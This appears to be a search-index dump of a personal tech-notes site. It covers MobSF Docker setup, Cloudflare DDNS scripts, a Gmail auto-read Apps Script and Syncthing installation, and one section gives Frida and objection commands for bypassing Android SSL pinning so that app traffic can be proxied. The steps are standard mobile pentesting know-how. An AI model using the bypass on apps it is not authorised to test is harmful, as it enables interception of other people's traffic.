"Mobile Security Framework (MobSF) \u00b6 Mobile Security Framework (MobSF) is an automated, all-in-one mobile application (Android/iOS/Windows) pen-testing, malware analysis and security assessment framework capable of performing static and dynamic analysis. MobSF support mobile app binaries (APK, XAPK, IPA & APPX) along with zipped source code and provides REST APIs for seamless integration with your CI/CD or DevSecOps pipeline.The Dynamic Analyzer helps you to perform runtime security assessment and interactive instrumented testing. Follow the projet at github: MobSF/Mobile-Security-Framework-MobSF Running MobSF as Docker \u00b6 Below is a docker run command for running MobSF as a Docker container. docker run \\ -d \\ -it \\ -v /root/tools/mobSF:/root/.MobSF \\ -h mobsf \\ --name mobsf \\ --restart always \\ -p 8005 :8000 \\ opensecurity/mobile-security-framework-mobsf:latest docker compose example for docker-compose.yml : version : '2.4' services : mobsf : image : opensecurity/mobile-security-framework-mobsf container_name : mobsf hostname : mobsf restart : always network_mode : bridge volumes : - ./:/root/.MobSF - /etc/localtime:/etc/localtime ports : - '1337:1337' - '8000:8000'", "title": "MobSF"}, {"location": "android/mobsf/#mobile-security-framework-mobsf", "text": "Mobile Security Framework (MobSF) is an automated, all-in-one mobile application (Android/iOS/Windows) pen-testing, malware analysis and security assessment framework capable of performing static and dynamic analysis. MobSF support mobile app binaries (APK, XAPK, IPA & APPX) along with zipped source code and provides REST APIs for seamless integration with your CI/CD or DevSecOps pipeline.The Dynamic Analyzer helps you to perform runtime security assessment and interactive instrumented testing. Follow the projet at github: MobSF/Mobile-Security-Framework-MobSF", "title": "Mobile Security Framework (MobSF)"}, {"location": "android/mobsf/#running-mobsf-as-docker", "text": "Below is a docker run command for running MobSF as a Docker container. docker run \\ -d \\ -it \\ -v /root/tools/mobSF:/root/.MobSF \\ -h mobsf \\ --name mobsf \\ --restart always \\ -p 8005 :8000 \\ opensecurity/mobile-security-framework-mobsf:latest docker compose example for docker-compose.yml : version : '2.4' services : mobsf : image : opensecurity/mobile-security-framework-mobsf container_name : mobsf hostname : mobsf restart : always network_mode : bridge volumes : - ./:/root/.MobSF - /etc/localtime:/etc/localtime ports : - '1337:1337' - '8000:8000'", "title": "Running MobSF as Docker"}, {"location": "android/ssl-pinning-bypass/", "tags": ["android", "frida", "ssl-pinning"], "text": "Android SSL Pinning Bypass with Frida \u00b6 Whats SSL Pinning? \u00b6 Android app establishes an HTTPS connection, it checks the issuer of the server's certificate against the internal list of trusted Android system certificate authorities to make sure it is communicating with a trusted server. This is called SSL Pinning. If the server's certificate is not in the list of trusted certificates, the app won't be able to communicate with the server. Whats Frida? \u00b6 Frida is dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers. It is a powerful tool that allows you to modify Android applications and libraries without having to recompile them. Requirements \u00b6 Rooted Adnroid Phone Python 3 pip(pip3) Installation \u00b6 Install Frida framework, objection to your host os. pip install frida-tools pip install objection Download the proper version from: Frida Server Downloads Danger Make sure to download the proper version of Frida Server for your Android cpu architecture. Alwasys use the latest version of Frida Server and frida-tools Extract and rename the file to frida-server Move the file to the Adnroid Phone to /data/local/tmp/ Usage \u00b6 Connect to adb shell to the android device For more inforatmati adb shell Change user to Root su Make sure you are running as root with the folowing command: whoami Change permissions to the /data/local/tmp/frida-server to be able to run the server chmod 755 /data/local/tmp/frida-server Run the Frida Server in background: /data/local/tmp/frida-server Warning Do no close the terminal - this will stop the Frida Server Go Back to host's terminal List all the Applications and find the name of the desired application you want to by bypass SSL Pinning frida-ps -Ua Now Run with the name of the application objection -g c**********n explore -q Now remove the SSL Pining with android sslpinning disable Set Proxy for Applciation with frida and objection \u00b6 android proxy set 192 .168.5.102 8081", "title": "SSL Pinning Bypass"}, {"location": "android/ssl-pinning-bypass/#android-ssl-pinning-bypass-with-frida", "text": "", "title": "Android SSL Pinning Bypass with Frida"}, {"location": "android/ssl-pinning-bypass/#whats-ssl-pinning", "text": "Android app establishes an HTTPS connection, it checks the issuer of the server's certificate against the internal list of trusted Android system certificate authorities to make sure it is communicating with a trusted server. This is called SSL Pinning. If the server's certificate is not in the list of trusted certificates, the app won't be able to communicate with the server.", "title": "Whats SSL Pinning?"}, {"location": "android/ssl-pinning-bypass/#whats-frida", "text": "Frida is dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers. It is a powerful tool that allows you to modify Android applications and libraries without having to recompile them.", "title": "Whats Frida?"}, {"location": "android/ssl-pinning-bypass/#requirements", "text": "Rooted Adnroid Phone Python 3 pip(pip3)", "title": "Requirements"}, {"location": "android/ssl-pinning-bypass/#installation", "text": "Install Frida framework, objection to your host os. pip install frida-tools pip install objection Download the proper version from: Frida Server Downloads Danger Make sure to download the proper version of Frida Server for your Android cpu architecture. Alwasys use the latest version of Frida Server and frida-tools Extract and rename the file to frida-server Move the file to the Adnroid Phone to /data/local/tmp/", "title": "Installation"}, {"location": "android/ssl-pinning-bypass/#usage", "text": "Connect to adb shell to the android device For more inforatmati adb shell Change user to Root su Make sure you are running as root with the folowing command: whoami Change permissions to the /data/local/tmp/frida-server to be able to run the server chmod 755 /data/local/tmp/frida-server Run the Frida Server in background: /data/local/tmp/frida-server Warning Do no close the terminal - this will stop the Frida Server Go Back to host's terminal List all the Applications and find the name of the desired application you want to by bypass SSL Pinning frida-ps -Ua Now Run with the name of the application objection -g c**********n explore -q Now remove the SSL Pining with android sslpinning disable", "title": "Usage"}, {"location": "android/ssl-pinning-bypass/#set-proxy-for-applciation-with-frida-and-objection", "text": "android proxy set 192 .168.5.102 8081", "title": "Set Proxy for Applciation with frida and objection"}, {"location": "automation/ddns-cloudflare-bash/", "tags": ["automation", "cloudflare", "ddns", "bash"], "text": "DDNS Cloudflare Bash Script \u00b6 When building complex infrastructure and managing multiple servers and services using ip addresses is can create a lot of issues and is not always easy to manage. The preferred way is to use a DNS provider that allows you to manage your domain names and their associated IP addresses. DDNS Cloudflare Bash script is a simple bash script that allows you to easily update your Cloudflare's DNS records dinamically regardless of your current IP address. DDNS Cloudflare Bash Script can be used on Linux, Unix, FreeBSD, and macOS with only one requirment of curl Source code can be found at DDNS Cloudflare Bash Github Repository . About \u00b6 DDNS Cloudflare Bash Script for most Linux , Unix distributions and MacOS . Choose any source IP address to update external or internal (WAN/LAN) . For multiply lan interfaces like Wifi, Docker Networks and Bridges the script will automatically detects the primary Interface by priority. Cloudflare's options proxy and TTL configurable via the config file. Optional Telegram Notifications Requirements \u00b6 curl Cloudflare api-token with ZONE-DNS-EDIT Permissions DNS Record must be pre created (api-token should only edit dns records) Installation \u00b6 You can place the script at any location manually. MacOS : Don't use the /usr/local/bin/ for the script location. Create a separate folder under your user path /Users/${USER} The automatic install examples below will place the script at /usr/local/bin/ wget https://raw.githubusercontent.com/fire1ce/DDNS-Cloudflare-Bash/main/update-cloudflare-dns.sh sudo chmod +x update-cloudflare-dns.sh sudo mv update-cloudflare-dns.sh /usr/local/bin/update-cloudflare-dns Config file download wget https://raw.githubusercontent.com/fire1ce/DDNS-Cloudflare-Bash/main/update-cloudflare-dns.conf Place the config file in the directory as the update-cloudflare-dns for above example at /usr/local/bin/ sudo mv update-cloudflare-dns.conf /usr/local/bin/update-cloudflare-dns.conf Config Parameters \u00b6 Option Example Description what_ip internal Which IP should be used for the record: internal/external dns_record ddns.example.com DNS A record which will be updated cloudflare_zone_api_token ChangeMe Cloudflare API Token KEEP IT PRIVET!!!! zoneid ChangeMe Cloudflare's Zone ID proxied false Use Cloudflare proxy on dns record true/false ttl 120 120-7200 in seconds or 1 for Auto Optional Notifications Parameters \u00b6 Option Example Description notify_me_telegram yes Use Telegram notifications yes/no telegram_chat_id ChangeMe Chat ID of the bot telegtam_bot_API_Token ChangeMe Telegtam's Bot API Token Running The Script \u00b6 When placed in /usr/local/bin/ update-cloudflare-dns Or manually <path>/.update-cloudflare-dns.sh Automation With Crontab \u00b6 You can run the script via crontab crontab -e Examples \u00b6 Run every minute * * * * * /usr/local/bin/update-cloudflare-dns Run every 2 minutes */2 * * * * /usr/local/bin/update-cloudflare-dns Run at boot @reboot /usr/local/bin/update-cloudflare-dns Run 1 minute after boot @reboot sleep 60 && /usr/local/bin/update-cloudflare-dns Run at 08:00 0 8 * * * /usr/local/bin/update-cloudflare-dns Logs \u00b6 This Script will create a log file with only the last run information Log file will be located at the script's location. Example: /usr/local/bin/update-cloudflare-dns.log Limitations \u00b6 Does not support IPv6 License \u00b6 MIT License \u00b6 Copyright\u00a9 3os.org @2020 Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. .md-typeset img { display: inline;", "title": "DDNS Cloudflare Bash"}, {"location": "automation/ddns-cloudflare-bash/#ddns-cloudflare-bash-script", "text": "When building complex infrastructure and managing multiple servers and services using ip addresses is can create a lot of issues and is not always easy to manage. The preferred way is to use a DNS provider that allows you to manage your domain names and their associated IP addresses. DDNS Cloudflare Bash script is a simple bash script that allows you to easily update your Cloudflare's DNS records dinamically regardless of your current IP address. DDNS Cloudflare Bash Script can be used on Linux, Unix, FreeBSD, and macOS with only one requirment of curl Source code can be found at DDNS Cloudflare Bash Github Repository .", "title": "DDNS Cloudflare Bash Script"}, {"location": "automation/ddns-cloudflare-bash/#about", "text": "DDNS Cloudflare Bash Script for most Linux , Unix distributions and MacOS . Choose any source IP address to update external or internal (WAN/LAN) . For multiply lan interfaces like Wifi, Docker Networks and Bridges the script will automatically detects the primary Interface by priority. Cloudflare's options proxy and TTL configurable via the config file. Optional Telegram Notifications", "title": "About"}, {"location": "automation/ddns-cloudflare-bash/#requirements", "text": "curl Cloudflare api-token with ZONE-DNS-EDIT Permissions DNS Record must be pre created (api-token should only edit dns records)", "title": "Requirements"}, {"location": "automation/ddns-cloudflare-bash/#installation", "text": "You can place the script at any location manually. MacOS : Don't use the /usr/local/bin/ for the script location. Create a separate folder under your user path /Users/${USER} The automatic install examples below will place the script at /usr/local/bin/ wget https://raw.githubusercontent.com/fire1ce/DDNS-Cloudflare-Bash/main/update-cloudflare-dns.sh sudo chmod +x update-cloudflare-dns.sh sudo mv update-cloudflare-dns.sh /usr/local/bin/update-cloudflare-dns Config file download wget https://raw.githubusercontent.com/fire1ce/DDNS-Cloudflare-Bash/main/update-cloudflare-dns.conf Place the config file in the directory as the update-cloudflare-dns for above example at /usr/local/bin/ sudo mv update-cloudflare-dns.conf /usr/local/bin/update-cloudflare-dns.conf", "title": "Installation"}, {"location": "automation/ddns-cloudflare-bash/#config-parameters", "text": "Option Example Description what_ip internal Which IP should be used for the record: internal/external dns_record ddns.example.com DNS A record which will be updated cloudflare_zone_api_token ChangeMe Cloudflare API Token KEEP IT PRIVET!!!! zoneid ChangeMe Cloudflare's Zone ID proxied false Use Cloudflare proxy on dns record true/false ttl 120 120-7200 in seconds or 1 for Auto", "title": "Config Parameters"}, {"location": "automation/ddns-cloudflare-bash/#optional-notifications-parameters", "text": "Option Example Description notify_me_telegram yes Use Telegram notifications yes/no telegram_chat_id ChangeMe Chat ID of the bot telegtam_bot_API_Token ChangeMe Telegtam's Bot API Token", "title": "Optional Notifications Parameters"}, {"location": "automation/ddns-cloudflare-bash/#running-the-script", "text": "When placed in /usr/local/bin/ update-cloudflare-dns Or manually <path>/.update-cloudflare-dns.sh", "title": "Running The Script"}, {"location": "automation/ddns-cloudflare-bash/#automation-with-crontab", "text": "You can run the script via crontab crontab -e", "title": "Automation With Crontab"}, {"location": "automation/ddns-cloudflare-bash/#examples", "text": "Run every minute * * * * * /usr/local/bin/update-cloudflare-dns Run every 2 minutes */2 * * * * /usr/local/bin/update-cloudflare-dns Run at boot @reboot /usr/local/bin/update-cloudflare-dns Run 1 minute after boot @reboot sleep 60 && /usr/local/bin/update-cloudflare-dns Run at 08:00 0 8 * * * /usr/local/bin/update-cloudflare-dns", "title": "Examples"}, {"location": "automation/ddns-cloudflare-bash/#logs", "text": "This Script will create a log file with only the last run information Log file will be located at the script's location. Example: /usr/local/bin/update-cloudflare-dns.log", "title": "Logs"}, {"location": "automation/ddns-cloudflare-bash/#limitations", "text": "Does not support IPv6", "title": "Limitations"}, {"location": "automation/ddns-cloudflare-bash/#license", "text": "", "title": "License"}, {"location": "automation/ddns-cloudflare-bash/#mit-license", "text": "Copyright\u00a9 3os.org @2020 Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. .md-typeset img { display: inline;", "title": "MIT License"}, {"location": "automation/ddns-cloudflare-powershell/", "tags": ["automation", "cloudflare", "ddns", "powershell"], "text": "DDNS Cloudflare PowerShell Script \u00b6 When building complex infrastructure and managing multiple servers and services using ip addresses is can create a lot of issues and is not always easy to manage. The preferred way is to use a DNS provider that allows you to manage your domain names and their associated IP addresses. DDNS Cloudflare PowerShell script is a simple PowerShell script that allows you to easily update your Cloudflare's DNS records dinamically regardless of your current IP address. DDNS Cloudflare PowerShell Script can be used on Windows operating systems without any requirements for PowerShell. Source code can be found at DDNS Cloudflare PowerShell Github Repository . DDNS Cloudflare PowerShell script for Windows . Choose any source IP address to update external or internal (WAN/LAN) . For multiply lan interfaces like Wifi, Docker Networks and Bridges the script will automatically detects the primary Interface by priority. Cloudflare's options proxy and TTL configurable via the parameters. Optional Telegram Notifications Requirements \u00b6 Cloudflare api-token with ZONE-DNS-EDIT Permissions DNS Record must be pre created (api-token should only edit dns records) Enabled running unsigned PowerShell Installation \u00b6 Download the DDNS-Cloudflare-PowerShell zip file & Unzip, rename to folder to DDNS-Cloudflare-PowerShell place in a directory of your choosing Config Parameters \u00b6 Update the config parameters at updateDNS.ps1 by editing the file Option Example Description what_ip internal Which IP should be used for the record: internal/external dns_record ddns.example.com DNS A record which will be updated cloudflare_zone_api_token ChangeMe Cloudflare API Token KEEP IT PRIVET!!!! zoneid ChangeMe Cloudflare's Zone ID proxied false Use Cloudflare proxy on dns record true/false ttl 120 120-7200 in seconds or 1 for Auto Optional Notifications Parameters \u00b6 Option Example Description notify_me_telegram yes Use Telegram notifications yes/no telegram_chat_id ChangeMe Chat ID of the bot telegtam_bot_API_Token ChangeMe Telegtam's Bot API Token Running The Script \u00b6 Open cmd/powershell Example: powershell.exe -ExecutionPolicy Bypass -File C: \\D DNS-Cloudflare-PowerShell \\u pdate-cloudflare-dns.ps1 Automation With Windows Task Scheduler \u00b6 Example: Run at boot with 1 min delay and repeat every 1 min Open Task Scheduler Action -> Crate Task General Menu Name: update-cloudflare-dns Run whether user is logged on or not Trigger New... Begin the task: At startup Delay task for: 1 minute Repeat task every: 1 minute for duration of: indefinitely Enabled Actions New... Action: Start a Program Program/script: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Add arguments: -ExecutionPolicy Bypass -File C:\\DDNS-Cloudflare-PowerShell\\update-cloudflare-dns.ps1 ok Enter your user's password when prompted Conditions Power: Uncheck - [x] Start the task only if the computer is on AC power Logs \u00b6 This Script will create a log file with only the last run information Log file will be located as same directory as update-cloudflare-dns.ps1 Log file name: update-cloudflare-dns.log Limitations \u00b6 Does not support IPv6 License \u00b6 MIT License \u00b6 Copyright\u00a9 3os.org @2020 Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. .md-typeset img { display: inline;", "title": "DDNS Cloudflare PowerShell"}, {"location": "automation/ddns-cloudflare-powershell/#ddns-cloudflare-powershell-script", "text": "When building complex infrastructure and managing multiple servers and services using ip addresses is can create a lot of issues and is not always easy to manage. The preferred way is to use a DNS provider that allows you to manage your domain names and their associated IP addresses. DDNS Cloudflare PowerShell script is a simple PowerShell script that allows you to easily update your Cloudflare's DNS records dinamically regardless of your current IP address. DDNS Cloudflare PowerShell Script can be used on Windows operating systems without any requirements for PowerShell. Source code can be found at DDNS Cloudflare PowerShell Github Repository . DDNS Cloudflare PowerShell script for Windows . Choose any source IP address to update external or internal (WAN/LAN) . For multiply lan interfaces like Wifi, Docker Networks and Bridges the script will automatically detects the primary Interface by priority. Cloudflare's options proxy and TTL configurable via the parameters. Optional Telegram Notifications", "title": "DDNS Cloudflare PowerShell Script"}, {"location": "automation/ddns-cloudflare-powershell/#requirements", "text": "Cloudflare api-token with ZONE-DNS-EDIT Permissions DNS Record must be pre created (api-token should only edit dns records) Enabled running unsigned PowerShell", "title": "Requirements"}, {"location": "automation/ddns-cloudflare-powershell/#installation", "text": "Download the DDNS-Cloudflare-PowerShell zip file & Unzip, rename to folder to DDNS-Cloudflare-PowerShell place in a directory of your choosing", "title": "Installation"}, {"location": "automation/ddns-cloudflare-powershell/#config-parameters", "text": "Update the config parameters at updateDNS.ps1 by editing the file Option Example Description what_ip internal Which IP should be used for the record: internal/external dns_record ddns.example.com DNS A record which will be updated cloudflare_zone_api_token ChangeMe Cloudflare API Token KEEP IT PRIVET!!!! zoneid ChangeMe Cloudflare's Zone ID proxied false Use Cloudflare proxy on dns record true/false ttl 120 120-7200 in seconds or 1 for Auto", "title": "Config Parameters"}, {"location": "automation/ddns-cloudflare-powershell/#optional-notifications-parameters", "text": "Option Example Description notify_me_telegram yes Use Telegram notifications yes/no telegram_chat_id ChangeMe Chat ID of the bot telegtam_bot_API_Token ChangeMe Telegtam's Bot API Token", "title": "Optional Notifications Parameters"}, {"location": "automation/ddns-cloudflare-powershell/#running-the-script", "text": "Open cmd/powershell Example: powershell.exe -ExecutionPolicy Bypass -File C: \\D DNS-Cloudflare-PowerShell \\u pdate-cloudflare-dns.ps1", "title": "Running The Script"}, {"location": "automation/ddns-cloudflare-powershell/#automation-with-windows-task-scheduler", "text": "Example: Run at boot with 1 min delay and repeat every 1 min Open Task Scheduler Action -> Crate Task General Menu Name: update-cloudflare-dns Run whether user is logged on or not Trigger New... Begin the task: At startup Delay task for: 1 minute Repeat task every: 1 minute for duration of: indefinitely Enabled Actions New... Action: Start a Program Program/script: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Add arguments: -ExecutionPolicy Bypass -File C:\\DDNS-Cloudflare-PowerShell\\update-cloudflare-dns.ps1 ok Enter your user's password when prompted Conditions Power: Uncheck - [x] Start the task only if the computer is on AC power", "title": "Automation With Windows Task Scheduler"}, {"location": "automation/ddns-cloudflare-powershell/#logs", "text": "This Script will create a log file with only the last run information Log file will be located as same directory as update-cloudflare-dns.ps1 Log file name: update-cloudflare-dns.log", "title": "Logs"}, {"location": "automation/ddns-cloudflare-powershell/#limitations", "text": "Does not support IPv6", "title": "Limitations"}, {"location": "automation/ddns-cloudflare-powershell/#license", "text": "", "title": "License"}, {"location": "automation/ddns-cloudflare-powershell/#mit-license", "text": "Copyright\u00a9 3os.org @2020 Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software. THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. .md-typeset img { display: inline;", "title": "MIT License"}, {"location": "automation/gmail-mark-archived-mail-as-read/", "text": "Automatically Mark Archived Email as Read in Gmail \u00b6 Background \u00b6 My preferred method of managing emails in Gmail is Zero Inbox . In short, emails in Inbox work as to-do list. The Inbox may contain important email i need to attend or a digital receipt from a payment I've made a minute ago. Since I know the content of that email the task is done and I archive it. This email will move from Inbox to All Mail or a dedicated label if you have automation rules. The Problem \u00b6 When using the Archive function email which weren't opened or marked as Read will show as number counter in All Mail or Dedicated Label. Since I'm done with those emails I have to manually mark emails as read. This is a tedious task and I don't want to do it manually The Solution \u00b6 Using Google Scripts We can create a personal app that will automatically mark emails as read when they are archived. This is a simple script that will run on Gmail and will mark emails as read when they are no longer in the inbox folder. You can choose how often you want to automatically mark archived email as read in gmail. This solution was tested on personal Gmail accounts and the Google Workspace Gmail accounts (as long you can grunt permission). Installation \u00b6 Make sure you are logged in to your Google account. Open Google Scripts and create a new project. You will be prompted with a new windwos. Rename the project to Automatically Mark Archived Email as Read . Copy and repace the following code to the new project. function markArchivedAsRead () { var threads = GmailApp . search ( 'label:unread -label:inbox' , 0 , 100 ); GmailApp . markThreadsRead ( threads ); var spamThreads = GmailApp . search ( 'label:spam -label:inbox' , 0 , 100 ); GmailApp . markThreadsRead ( spamThreads ); } Your windwos should look like this: Save the project. After saving the project you should be able Run the script. On the first run the script will ask you to give it the necessary permissions. Click Review permissions to continue. Since the app is not signed you will be prompted with a warning. I's ok and safe. Click Advanced . Click Go to Gmail Mark Archived as Read (unsafe) to continue. At this point you will be prompted to grant the script Automatically Mark Archived Email as Read access to your Gmail account. Click Allow . This will alow the script to perform the actions you need. If all went well you should see the log of the script as show bellow. At this point we create a Automatically Mark Archived Email as Read script and grunt it the necessary permissions. NNow we want to automate the process. We can do this by creating a new timed trigger. Head over the Trigger menu Click Add Trigger . You will be prompted to select when and how the script will run. The following example will run the script every 5 minutes, and send a failure email report onece a week. Note The script may fail onces in a while. This is due to the fact it depends on Gmail's API. Unless you receive an email with hunders of failed attempts, you can ignore the email. Note Update: Some people are reporting an error which says \"This operation can only be applied to at most 100 threads. (line 3, file \"Code\")\". To fix this, you have to manually do a search for \"is:unread\" and mark all of them as read before running the script, so that it starts with a clean slate. The script can only process 100 threads per run, so if you give it more than 100 on the first run, After creating the trigger you screen should look like this: Now we whant to ensure that the script runs every 5 minutes. We can do this in Execution menu: When 5 minutes passed from the point the trigger was created, the page log should look like this: We are done with the installation and the configuration. You should already be able to see that some of the emails are marked as read. Limitations \u00b6 Google's API is limited to 100 threads per request - a single script's run. This means that every 5 minutes it runs it will mark 100 emails as read. Since the script is run every 5 minutes, it won't take long to mark all emails as read automatically. If you aren't able to wait you can do it mark emails as read manually. Troubleshooting \u00b6 I've seen this script working without any issues for months, But suddenly you may receive an email with the Automatically Mark Archived Email as Read failing to run all the time. The reason is that the script lost the Gmail permissions. The solution is to run the script manually and grant the script the necessary permissions as the first time.", "title": "Gmail Mark Archived as Read"}, {"location": "automation/gmail-mark-archived-mail-as-read/#automatically-mark-archived-email-as-read-in-gmail", "text": "", "title": "Automatically Mark Archived Email as Read in Gmail"}, {"location": "automation/gmail-mark-archived-mail-as-read/#background", "text": "My preferred method of managing emails in Gmail is Zero Inbox . In short, emails in Inbox work as to-do list. The Inbox may contain important email i need to attend or a digital receipt from a payment I've made a minute ago. Since I know the content of that email the task is done and I archive it. This email will move from Inbox to All Mail or a dedicated label if you have automation rules.", "title": "Background"}, {"location": "automation/gmail-mark-archived-mail-as-read/#the-problem", "text": "When using the Archive function email which weren't opened or marked as Read will show as number counter in All Mail or Dedicated Label. Since I'm done with those emails I have to manually mark emails as read. This is a tedious task and I don't want to do it manually", "title": "The Problem"}, {"location": "automation/gmail-mark-archived-mail-as-read/#the-solution", "text": "Using Google Scripts We can create a personal app that will automatically mark emails as read when they are archived. This is a simple script that will run on Gmail and will mark emails as read when they are no longer in the inbox folder. You can choose how often you want to automatically mark archived email as read in gmail. This solution was tested on personal Gmail accounts and the Google Workspace Gmail accounts (as long you can grunt permission).", "title": "The Solution"}, {"location": "automation/gmail-mark-archived-mail-as-read/#installation", "text": "Make sure you are logged in to your Google account. Open Google Scripts and create a new project. You will be prompted with a new windwos. Rename the project to Automatically Mark Archived Email as Read . Copy and repace the following code to the new project. function markArchivedAsRead () { var threads = GmailApp . search ( 'label:unread -label:inbox' , 0 , 100 ); GmailApp . markThreadsRead ( threads ); var spamThreads = GmailApp . search ( 'label:spam -label:inbox' , 0 , 100 ); GmailApp . markThreadsRead ( spamThreads ); } Your windwos should look like this: Save the project. After saving the project you should be able Run the script. On the first run the script will ask you to give it the necessary permissions. Click Review permissions to continue. Since the app is not signed you will be prompted with a warning. I's ok and safe. Click Advanced . Click Go to Gmail Mark Archived as Read (unsafe) to continue. At this point you will be prompted to grant the script Automatically Mark Archived Email as Read access to your Gmail account. Click Allow . This will alow the script to perform the actions you need. If all went well you should see the log of the script as show bellow. At this point we create a Automatically Mark Archived Email as Read script and grunt it the necessary permissions. NNow we want to automate the process. We can do this by creating a new timed trigger. Head over the Trigger menu Click Add Trigger . You will be prompted to select when and how the script will run. The following example will run the script every 5 minutes, and send a failure email report onece a week. Note The script may fail onces in a while. This is due to the fact it depends on Gmail's API. Unless you receive an email with hunders of failed attempts, you can ignore the email. Note Update: Some people are reporting an error which says \"This operation can only be applied to at most 100 threads. (line 3, file \"Code\")\". To fix this, you have to manually do a search for \"is:unread\" and mark all of them as read before running the script, so that it starts with a clean slate. The script can only process 100 threads per run, so if you give it more than 100 on the first run, After creating the trigger you screen should look like this: Now we whant to ensure that the script runs every 5 minutes. We can do this in Execution menu: When 5 minutes passed from the point the trigger was created, the page log should look like this: We are done with the installation and the configuration. You should already be able to see that some of the emails are marked as read.", "title": "Installation"}, {"location": "automation/gmail-mark-archived-mail-as-read/#limitations", "text": "Google's API is limited to 100 threads per request - a single script's run. This means that every 5 minutes it runs it will mark 100 emails as read. Since the script is run every 5 minutes, it won't take long to mark all emails as read automatically. If you aren't able to wait you can do it mark emails as read manually.", "title": "Limitations"}, {"location": "automation/gmail-mark-archived-mail-as-read/#troubleshooting", "text": "I've seen this script working without any issues for months, But suddenly you may receive an email with the Automatically Mark Archived Email as Read failing to run all the time. The reason is that the script lost the Gmail permissions. The solution is to run the script manually and grant the script the necessary permissions as the first time.", "title": "Troubleshooting"}, {"location": "automation/syncthings/", "tags": ["syncthing", "automation", "linux", "macos", "synology", "windows"], "text": "Syncthing \u00b6 Syncthing is a continuous file synchronization program. Syncthing is an application that allows you to synchronize files between multiple devices. This means that creating, editing, or deleting files on one computer can be automatically copied to other devices. Official website: syncthing.net Debian/Ubuntu Installation \u00b6 We need to add the following Syncthing repository to the system. First, we need to add PGP keys to allow the system to check the packages authenticity sudo curl -s -o /usr/share/keyrings/syncthing-archive-keyring.gpg https://syncthing.net/release-key.gpg Then we will add the stable Syncthing repository channel to your APT sources echo \"deb [signed-by=/usr/share/keyrings/syncthing-archive-keyring.gpg] https://apt.syncthing.net/ syncthing stable\" | sudo tee /etc/apt/sources.list.d/syncthing.list Now we can update the package list and install Syncthing sudo apt update sudo apt install syncthing Configuration Syncthing as a Service \u00b6 Configuring Syncthing as a service will provide as the ability to start and stop and enable/disable the service at boot. Create a systemd unit file for managing the Syncthing service. nano /etc/systemd/system/syncthing@.service In the next example we will be setting the Syncthing service UI to listen on local host (127.0.0.1) and port 8384 Add the following lines to the syncthing@.service : [Unit] Description = Syncthing - Open Source Continuous File Synchronization for % I Documentation = man : syncthing ( 1 ) After = network . target [Service] User = % i ExecStart = / usr / bin / syncthing - no-browser - gui-address = \"127.0.0.1:8384\" - no-restart - logflags = 0 Restart = on-failure SuccessExitStatus = 3 4 RestartForceExitStatus = 3 4 [Install] WantedBy = multi-user . target Save and close the file when you are finished. 